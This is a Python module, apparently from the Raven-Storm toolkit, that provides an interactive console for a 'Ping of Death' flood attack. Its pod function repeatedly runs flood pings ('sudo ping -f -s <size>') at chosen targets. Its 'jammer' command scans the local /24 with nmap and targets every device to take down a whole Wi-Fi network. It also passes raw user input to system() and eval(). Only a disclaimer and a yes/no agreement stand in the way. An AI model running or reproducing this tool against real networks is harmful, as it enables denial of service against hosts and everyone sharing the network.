from CLIF_Framework.framework import event
from CLIF_Framework.framework import tools
from os import system
try:
	from os import geteuid
	geteuid_exists = True
except ImportError:
	geteuid_exists = False
from time import sleep
import socket
try:
	import nmap
except Exception as e:
	print("Please install following module:", e)
	quit()
event = event()
tools = tools()


class Main:
	def __init__(selfie, console):
		global self
		global var
		self = selfie
		var = console

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.nm = None
		var.nmapinstalled = False
		var.target = ""
		var.size = 65500
		var.threads = 30
		var.sleep = 0
		var.interval = 0
		var.auto_stop = 0

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.commands(self.show_values, ["values", "ls"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.help(["values", "ls"], "Show all options.")

		event.help("target", "Set the target.")
		event.help("targets", "Set multiple targets.")
		event.help("size", "Set packet size.")
		event.help("threads", "Threads to use.")
		event.help("sleep", "Delay between threads.")
		event.help("interval", "Delay between each packet send.")
		event.help("auto stop", "Automatically stop attack after x seconds.")
		event.help("run", "Run the Ping of Death.")
		event.help("jammer", "Kill a whole wifi network, by targeting all.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
The creators of Raven-Storm are not responsible
for any of your activitys or issues caused by Raven-Storm!
It is strictly illegal to exploit servers
which are not owned by you.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()
		if not geteuid_exists:
			print("")
			print("I am sorry, but this feature is currently not supported on stock Windows, try wsl.")
			print("You will be redirected to the main menu.")
			print("")
			input("[Press Enter]")
			print("")
			var.stop()

	def exit_console(self):
		print("\033[1;32;0mHave a nice day.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Enter shell command: \033[1;32;0m", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("Enter debug command: \033[1;32;0m", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		try:
			var.nm = nmap.PortScanner()
			var.nmapinstalled = True
		except Exception as e:
			system("clear || cls")
			print("Please install the nmap package.")
			print("Some functions will not work without it.")
			print(e)
			try:
				input("[Press enter to continue without nmap]")
			except Exception:
				quit()
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("The command you entered does not exist.")
		print("")

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	def show_values(self):
		print("")
		print("Targets: %s" % var.target)
		print("Packet Size: %s" % var.size)
		print("Threads: %s" % var.threads)
		print("Delay between threads: %s" % var.sleep)
		print("Delay between packets: %s" % var.interval)
		print("Time to auto stop: %s" % var.auto_stop)
		print("")

	def help(self):
		event.help_title("\x1b[1;39mPoD Help:\x1b[0;39m")
		tools.help("|-- ", " :: ", event)
		print("\033[1;32;0m")

	@event.command
	def targets(command):
		print("")
		var.target = tools.arg("Targets (Seperated by ', '): ", "targets ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("This IP does not exist.")
		print("")

	@event.command
	def target(command):
		print("")
		var.target = tools.arg("Target: ", "target ", command)
		if "." not in var.target:
			print("This IP does not exist.")
		print("")

	@event.command
	def size(command):
		print(" ")
		try:
			sizezw = int(tools.arg("Size in kb: ", "size ", command))
			if sizezw < 5:
				print("Size needs to be more than 4kb.")
			elif sizezw > 65500:
				print("Size needs to be less than 65500kb.")
			else:
				var.size = sizezw
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def threads(command):
		print(" ")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def sleep(command):
		print(" ")
		try:
			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def interval(command):
		print(" ")
		try:
			var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.auto_stop = int(tools.arg("Time until auto stop: ", "auto stop ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def jammer():
		print(" ")
		try:
			gateways = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			gateways.connect(("8.8.8.8", 80))
			gateway = ".".join((gateways.getsockname()[0].split("."))[:len(gateways.getsockname()[0].split(".")) - 1])
			localip = gateways.getsockname()[0]
			gateways.close()
			var.nm.scan(hosts=("%s.0/24" % gateway), arguments="-sP")
			lanscandev = [(x) for x in var.nm.all_hosts()]
			var.target = []
			for lanscandevice in lanscandev:
				if lanscandevice != localip and lanscandevice != ("%s.1" % gateway):
					var.target.append(lanscandevice)
			print("All devices in Internet are now targeted.", var.target)
		except Exception as e:
			if not var.nmapinstalled:
				print("Please install nmap to continue.")
			else:
				print("There was an error while executing.", e)
		print(" ")

	def pod(self, size, target, threads, threadssleep, podinterval, podautodl):
		print(("Starting attack...\nC_B[Hit CTRL + Z to stop the attack]C_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		targets = []
		feat = ""
		if podinterval != 0:
			feat += ("-i %s " % podinterval)
		if podautodl != 0:
			feat += ("-w %s " % podautodl)
		if isinstance(target, list):
			targets = target
		else:
			targets = [target]
		del(target)
		for target in targets:
			if geteuid() == 0:
				print(("Starting thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
				killcom = ('sudo ping -f -q -s %s %s %s  > /dev/null' % (size, feat, target)).replace("  ", " ")
			else:
				print(("Starting thread C_BwithoutC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
				killcom = ("ping -q -s %s %s %s > /dev/null" % (size, feat, target)).replace("  ", " ")
			try:
				for i in range(int(threads)):
					system(killcom)
					sleep(float(threadssleep))
			except KeyboardInterrupt:
				system("killall ping")
				print("Attack abort.")
				quit()
			except Exception as pingerror:
				print("An error was caught while executing.", pingerror)
				system("killall ping")
				print("Attack abort.")
				quit()
			try:
				input("")
				system("killall ping")
				print("Attack abort.")
				quit()
			except Exception:
				system("killall ping")
				print("Attack abort.")
				quit()
			print("Attack abort.")

	@event.command
	def run():
		if not tools.question("\nDo you agree to not use this tool for illegal purpose?"):
			print("Agreement not accepted.")
			quit()
		else:
			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)


def setup(console):
	console.ps1 = "\033[1;32;0mL3> "
	console.add(Main(console), event)
